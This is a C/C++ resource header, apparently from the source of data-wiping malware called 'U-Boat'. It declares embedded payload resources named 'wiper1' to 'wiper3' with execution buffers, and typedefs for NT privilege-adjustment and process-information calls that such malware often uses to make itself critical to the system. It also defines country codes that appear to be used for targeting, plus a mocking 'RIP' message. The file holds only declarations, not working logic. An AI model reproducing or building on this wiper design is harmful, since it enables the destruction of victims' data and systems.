//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by U-Boat.rc
//
#define IDR_WPR01                       101
#define IDR_WPR11                       102
#define IDR_WPR21                       103
#define IDR_WPR31                       104
#define IDR_WPR41                       105

DWORD Size[3];
const LPCSTR lpnArr[3] = { "wiper1","wiper2","wiper3" };
HGLOBAL ExecBuffer[3];
static unsigned int ScA;
const char* const rip = "RIP";
const char* const priest = "Receive the Lord's blessing. The Lord bless you and watch over you.\
							The Lord make his face shine upon you, and be gracious to you. The Lord \
						look kindly on you and give you peace; In the Name of the Father, and of the \
								Son + and of the Holy Spirit.\"Congregation: \" Amen.";

typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI* PtrAdjPrv)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI* PtrSInfoProc)(HANDLE ProcessHandle, ULONG ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
#define UKR								241
#define ALB								0x6
#define BEL								0x15
#define	BGR								0x23
#define CAN								0x27
#define HRV								0x6c
#define CZE								0x4b
#define FRA								0x54
#define UK								0xf2

#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        106
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
